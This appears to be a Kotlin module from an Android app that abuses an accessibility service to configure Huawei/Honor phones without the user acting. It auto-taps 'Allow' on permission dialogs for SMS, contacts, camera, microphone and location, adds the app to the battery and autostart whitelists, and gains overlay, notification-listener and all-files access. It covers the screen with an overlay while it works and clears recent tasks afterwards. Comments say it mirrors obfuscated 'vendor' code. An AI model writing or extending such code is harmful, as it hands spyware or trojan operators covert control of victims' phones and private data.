package com.storm.safe.rock.service.modules.yw5xud

import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.view.WindowManager
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import com.storm.safe.rock.service.modules.yw5xud.common.FoldableDeviceDetector
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiHonorPermDialog
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiOverlayHelper
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep1BasicPerms
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep2BatteryWhitelist
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep3BatterySettings
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep4NotifListener
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep5AutoStart
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep6Overlay
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep7NotifPerm
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep8AllFiles
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStep9ClearTasks
import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiStepLogger
import kotlinx.coroutines.delay
import java.util.Locale

/**
 * HuaweiSteps -- Huawei/Honor (EMUI/HarmonyOS/MagicOS) configuration automation.
 *
 * Thin orchestrator that delegates the 9-step flow to individual step classes
 * in the `huawei/` package. Each step receives `service`, `ui`, and a reference
 * to this orchestrator for shared state (`isHuawei`, `appLabel`, `packageName`,
 * screen dimensions, etc.).
 *
 * Matches vendor C0365a2 (a2, HuaweiSteps). Executes a 10-step orchestration
 * aligned with vendor executeAll (m212162a9, L1310-1622).
 */
open class HuaweiSteps(
    service: MyAccessibilityService?,
    context: Context,
    ui: UiAutomation = UiAutomation(service, context)
) : VendorSteps(service, context, ui) {
    override val tag = "HuaweiSteps"

    /**
     * Vendor C0365a2.f55064a2 -- true when Build.BRAND lowercased == "honor".
     * `open` so unit tests can override via Mockito spies.
     */
    open val isHuawei: Boolean = (Build.BRAND ?: "").lowercase(Locale.ROOT) == "honor"

    /** Vendor C0365a2.f55062a0.getPackageName(). */
    val packageName: String = context.packageName

    /** Public accessor for the protected context — used by delegate step classes. */
    val ctx: Context get() = context

    // --- Result sealed types ---

    sealed class VerifyResult {
        object Pass : VerifyResult()
        data class Fail(val reason: String) : VerifyResult()
        object NeedRetry : VerifyResult()
    }

    sealed class LockVerifyResult {
        object Locked : LockVerifyResult()
        object Unlocked : LockVerifyResult()
        object Unknown : LockVerifyResult()
    }

    sealed class HonorClickResult {
        data class Clicked(val keyword: String) : HonorClickResult()
        object NotFound : HonorClickResult()
    }

    data class HonorPercentConfig(
        val x1: Float,
        val y1: Float,
        val x2: Float,
        val y2: Float,
        val description: String
    )

    sealed class StepResult {
        data class Success(val message: String) : StepResult()
        data class Failure(val message: String) : StepResult()
        data class NeedVerify(val message: String) : StepResult()
    }

    companion object {
        private const val TAG = "HuaweiSteps"

        val STARTUP_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"),
            ComponentName("com.hihonor.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"),
            ComponentName("com.hihonor.systemmanager", "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.power.ui.HwPowerManagerActivity"),
            ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.power.ui.HwBatterySettings")
        )

        val AUTO_MANAGE_KEYWORDS = listOf("自动管理", "自动运行", "Auto-manage", "Auto manage")

        val STARTUP_ALLOW_KEYWORDS = listOf(
            "允许自启动", "允许关联启动", "允许后台活动",
            "Allow auto-launch", "Allow associated startup", "Allow background activity"
        )

        val DONT_OPTIMIZE_KEYWORDS = listOf("不优化", "Don't optimize", "Not optimized", "无限制")

        val OVERLAY_SEARCH_BOX_IDS: List<String> = listOf(
            "android:id/search_src_text",
            "com.android.settings:id/search_src_text",
            "com.hihonor.settings:id/search_src_text"
        )

        val CLEAR_ALL_RECENTS_VIEW_IDS: List<String> = listOf(
            "com.huawei.android.launcher:id/clear_all_recents_image_button",
            "com.huawei.android.launcher:id/clearbox",
            "com.huawei.android.launcher:id/clear_all_btn",
            "com.huawei.android.launcher:id/clear_all",
            "com.huawei.android.launcher:id/clearAnimView",
            "com.huawei.android.launcher:id/clear_button",
            "com.huawei.android.launcher:id/dismiss_task",
            "com.hihonor.android.launcher:id/clear_all_recents_image_button",
            "com.hihonor.android.launcher:id/clearbox",
            "com.hihonor.android.launcher:id/clear_all_btn",
            "com.hihonor.android.launcher:id/clear_all",
            "com.hihonor.android.launcher:id/clearAnimView",
            "com.hihonor.android.launcher:id/clear_button",
            "com.android.systemui:id/clear_all",
            "com.android.systemui:id/dismiss_all"
        )

        val CLEAR_ALL_CONTENT_DESCS: List<String> = listOf(
            "关闭所有最近打开的应用",
            "关闭全部",
            "关闭所有",
            "清除全部",
            "清空"
        )

        val CLEAR_ALL_TEXT_KEYWORDS: List<String> = listOf(
            "清空", "一键清理", "全部清理", "清除全部", "清除", "清理全部", "清理",
            "关闭全部", "关闭所有",
            "清空", "一鍵清理", "全部清理", "清除全部", "清除", "清理全部", "清理",
            "關閉全部", "關閉所有"
        )

        val RECENTS_VERIFY_KEYWORDS: List<String> = listOf("清空", "一键清理", "全部清理", "清除", "清理", "关闭全部")

        val LOCK_INDICATOR_TEXTS: List<String> = listOf(
            "解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제", "Entsperren", "Déverrouiller"
        )

        val LOCK_ICON_VIEW_IDS: List<String> = listOf(
            "com.huawei.android.launcher:id/lock_icon",
            "com.huawei.android.launcher:id/iv_lock",
            "com.huawei.android.launcher:id/task_lock",
            "com.hihonor.android.launcher:id/lock_icon",
            "com.hihonor.android.launcher:id/iv_lock"
        )

        val OVERLAY_SWITCH_TEXTS: List<String> = listOf(
            "显示在其他应用的上层",
            "在其他应用上层显示",
            "显示在其他应用上层",
            "允许显示在其他应用的上层",
            "悬浮窗",
            "显示悬浮窗"
        )

        fun isHonorPermissionTitle(title: String): Boolean {
            if (title.isEmpty()) return false
            val keywords = arrayOf(
                "是否允许", "允许", "权限", "拍摄照片", "录制视频",
                "访问", "拍摄", "录制", "麦克风", "位置",
                "存储", "相册", "通讯录", "短信", "SMS",
                "电话", "Phone", "日历", "Calendar", "传感器",
                "Sensors", "蓝牙", "Bluetooth"
            )
            for (kw in keywords) {
                if (title.contains(kw)) return true
            }
            return false
        }

        fun getHonorPercentConfig(title: String): HonorPercentConfig {
            return when {
                title.contains("拍摄") || title.contains("相机") ||
                    title.contains("录制视频") || title.contains("Camera") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "Camera")

                title.contains("照片") || title.contains("图片") ||
                    title.contains("视频") || title.contains("相册") || title.contains("媒体") ||
                    title.contains("Photo") || title.contains("Video") || title.contains("Media") ->
                    HonorPercentConfig(0.65f, 0.845f, 0.65f, 0.815f, "Photos")

                title.contains("录制音频") || title.contains("录音") ||
                    title.contains("麦克风") || title.contains("音频") ||
                    title.contains("Microphone") || title.contains("Record audio") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "Microphone")

                title.contains("短信") || title.contains("信息") ||
                    title.contains("SMS") || title.contains("Message") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "SMS")

                title.contains("电话") || title.contains("通话") ||
                    title.contains("拨打") || title.contains("Phone") || title.contains("Call") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "Phone")

                title.contains("通讯录") || title.contains("联系人") ||
                    title.contains("Contacts") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "Contacts")

                title.contains("位置") || title.contains("定位") ||
                    title.contains("Location") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "Location")

                title.contains("存储") || title.contains("文件") ||
                    title.contains("Storage") || title.contains("File") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "Storage")

                title.contains("日历") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "Calendar")

                title.contains("通知") || title.contains("Notification") ->
                    HonorPercentConfig(0.65f, 0.77f, 0.65f, 0.795f, "Notification")

                title.contains("设备") || title.contains("IMEI") ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "Device")

                else ->
                    HonorPercentConfig(0.75f, 0.88f, 0.75f, 0.9f, "Default")
            }
        }

        fun getOverlayListFallbackPoint(widthPx: Int, heightPx: Int): Pair<Float, Float> {
            val (wPct, hPct) = when {
                widthPx <= 720 -> 0.85f to 0.25f
                widthPx <= 1080 -> 0.88f to 0.26f
                else -> 0.90f to 0.27f
            }
            return (widthPx * wPct) to (heightPx * hPct)
        }

        val MODE2_KEYWORDS: Array<String> = arrayOf(
            "允许", "始终允许", "仅在使用中允许", "确定", "同意",
            "Allow", "Allow always", "While using the app", "OK", "Agree"
        )
    }

    // --- Shared helpers (used by multiple step delegates) ---

    open fun canWriteSettings(): Boolean {
        return try {
            Settings.System.canWrite(context)
        } catch (_: Exception) {
            false
        }
    }

    open fun getScreenWidthPx(): Int {
        return try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return 1080
            if (Build.VERSION.SDK_INT >= 30) {
                wm.currentWindowMetrics.bounds.width()
            } else {
                val p = android.graphics.Point()
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealSize(p)
                p.x
            }
        } catch (_: Exception) {
            1080
        }
    }

    open fun getScreenHeightPx(): Int {
        return try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return 1920
            if (Build.VERSION.SDK_INT >= 30) {
                wm.currentWindowMetrics.bounds.height()
            } else {
                val p = android.graphics.Point()
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealSize(p)
                p.y
            }
        } catch (_: Exception) {
            1920
        }
    }

    // --- Main orchestration ---

    override suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "executeAll start isHuawei=$isHuawei, pkg=$packageName, label=$appLabel")

        if (canWriteSettings()) {
            android.util.Log.i(TAG, "Settings.System.canWrite=true, skip entire flow")
            logs.add("HuaweiSteps skip -- canWrite=true")
            successes.add("HuaweiSteps: canWrite=true, skip")
            return
        }

        HuaweiOverlayHelper.show(service)
        delay(200L)

        if (FoldableDeviceDetector.isFoldable(context)) {
            val activated = FoldableDeviceDetector.activateLeftPanel(service)
            HuaweiStepLogger.probe(0, "folded-device-activated", "activated=$activated")
            logs.add("Foldable: activateLeftPanel=$activated")
            delay(500L)
        }

        val stepDelay = 1500L

        HuaweiStepLogger.phase(1, "基础权限", detail = "仅非荣耀", logs = logs)
        if (!isHuawei) {
            HuaweiStep1BasicPerms(service, ui, this).execute(successes, failures, logs)
        } else {
            HuaweiStepLogger.skip(1, "荣耀设备跳过基础权限", logs)
        }

        HuaweiStepLogger.probe(1, "stop-permission-granter", "ADAPT: not accessible")

        HuaweiStepLogger.phase(2, "电池优化白名单", logs = logs)
        HuaweiStep2BatteryWhitelist(service, ui, this).execute(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(3, "电池设置", logs = logs)
        HuaweiStep3BatterySettings(service, ui, this).execute(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(4, "通知使用权", detail = "仅荣耀", logs = logs)
        if (isHuawei) {
            HuaweiStep4NotifListener(service, ui, this).execute(successes, failures, logs)
        } else {
            HuaweiStepLogger.skip(4, "非荣耀跳过通知使用权", logs)
        }
        delay(stepDelay)

        HuaweiStepLogger.phase(5, "自启动权限", logs = logs)
        HuaweiStep5AutoStart(service, ui, this).execute(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(6, "悬浮窗权限", logs = logs)
        HuaweiStep6Overlay(service, ui, this).execute(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(7, "通知权限", logs = logs)
        HuaweiStep7NotifPerm(service, ui, this).execute(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(8, "所有文件访问权限", logs = logs)
        HuaweiStep8AllFiles(service, ui, this).execute(successes, failures, logs)
        delay(stepDelay)

        HuaweiStepLogger.phase(9, "清除最近任务", logs = logs)
        HuaweiStep9ClearTasks(service, ui, this).execute(successes, failures, logs)

        HuaweiOverlayHelper.remove(service)

        // Return to app foreground
        try {
            val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(
                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                        android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP
                )
                service?.startActivity(launchIntent) ?: context.startActivity(launchIntent)
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "Return to app failed: ${e.message}")
        }

        android.util.Log.i(TAG, "executeAll done success=${successes.size} failure=${failures.size}")
        successes.add("HuaweiSteps: done")

        try {
            DeviceAuthorizationManager.markAuthCompleted(context)
        } catch (e: Exception) {
            android.util.Log.w(TAG, "markAuthCompleted failed: ${e.message}")
        }
    }

    // --- Honor permission dialog (delegated) ---

    open suspend fun detectAndClickHonorPermissionDialog(): HonorClickResult {
        return HuaweiHonorPermDialog(service, ui, this).detectAndClick()
    }
}
